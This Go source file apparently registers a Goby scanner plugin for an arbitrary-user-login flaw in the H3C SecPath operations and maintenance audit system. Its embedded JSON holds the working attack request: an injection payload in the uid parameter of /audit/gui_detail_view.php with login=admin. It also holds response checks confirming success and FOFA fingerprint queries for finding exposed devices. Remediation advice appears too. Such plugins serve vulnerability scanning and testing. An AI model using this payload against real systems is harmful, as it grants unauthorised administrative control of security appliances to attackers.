package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "H3C SECPATH Operations and Maintenance Audit System",
    "Description": "H3C-SECPATH - Operations and Maintenance Audit System Arbitrary user login",
    "Impact": "H3C SECPATH Operations and Maintenance Audit System",
    "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.h3c.com/cn/\">http://www.h3c.com/ cn/</a></p><p>2. If it is not necessary, it is forbidden to access the device from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "H3C-SecPATH-OMAS",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "H3C SECPATH运维审计系统任意用户登录",
            "Description": "H3C SecPath 运维审计系统是基于用户现阶段面临的运维难题提出的一款运维风险管控产品。该系统存在任意用户登录漏洞，攻击者可通过输入特殊 url，达到任意用户登录的目的。",
            "Impact": "<p>H3C SecPath 运维审计系统是基于用户现阶段面临的运维难题提出的一款运维风险管控产品。</p><p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">H3C SecPath 运维审计系统</span>存在任意用户登录漏洞，攻击者可通过输入特殊 url，达到任意用户登录的目的，登陆后可查看系统信息，修改系统配置，进而控制整个系统。<br></p>",
            "Recommendation": "<p>1、请用户联系厂商修复漏洞：<a href=\"http://www.h3c.com/cn/\" target=\"_blank\">http://www.h3c.com/cn/</a></p><p>2、如非必要，禁止公网访问该设备。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "H3C-SecPath-运维审计系统",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "H3C SECPATH Operations and Maintenance Audit System",
            "Description": "H3C-SECPATH - Operations and Maintenance Audit System Arbitrary user login",
            "Impact": "H3C SECPATH Operations and Maintenance Audit System",
            "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.h3c.com/cn/\" target=\"_blank\">http://www.h3c.com/ cn/</a></p><p>2. If it is not necessary, it is forbidden to access the device from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Product": "H3C-SecPATH-OMAS",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "(title=\"H3C SecPath 运维审计\") || title=\"H3C SecPath 运维审计\" || body=\"<span>H3C SecPath 运维审计系统</span></div>\"",
    "GobyQuery": "(title=\"H3C SecPath 运维审计\") || title=\"H3C SecPath 运维审计\" || body=\"<span>H3C SecPath 运维审计系统</span></div>\"",
    "Author": "kio",
    "Homepage": "h3c.com",
    "DisclosureDate": "2021-04-18",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "错误的id",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "错误的id",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "H3C-SecPath-Operation-and-maintenance-audit-system"
        ]
    },
    "PocId": "10183"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
